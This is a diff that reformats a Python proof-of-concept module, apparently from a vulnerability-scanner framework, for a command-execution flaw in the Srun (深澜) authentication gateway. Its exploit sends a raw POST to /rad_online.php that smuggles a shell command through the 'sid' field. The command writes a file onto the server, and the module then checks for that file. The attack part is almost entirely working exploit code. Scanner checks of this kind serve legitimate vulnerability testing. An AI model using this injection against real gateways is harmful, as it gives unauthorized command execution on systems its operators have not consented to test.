@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Srun_0002' # 平台漏洞编号，留空
+    vuln_id = 'Srun_0002'  # 平台漏洞编号，留空
     name = 'Srun 网关 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         深澜网关 /rad_online.php页面可执行任意命令。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '深澜认证平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'c4c782e3-9c5c-46e7-a083-bc961a6ec595'
@@ -30,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             poc = self.target + '/rad_online.php'
             raw = '''
@@ -48,7 +50,7 @@ Content-Length: 200
 
 action=dm&sid=;echo+'vulnerable' > vul.php;
             '''
-            code, head, res, errcode, _ = hh.http(poc,raw=raw)
+            code, head, res, errcode, _ = hh.http(poc, raw=raw)
             verify = self.target + '/vul.php'
             code, head, res, errcode, _ = hh.http(verify)
             if 'vulnerable' in res:
@@ -61,6 +63,7 @@ action=dm&sid=;echo+'vulnerable' > vul.php;
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
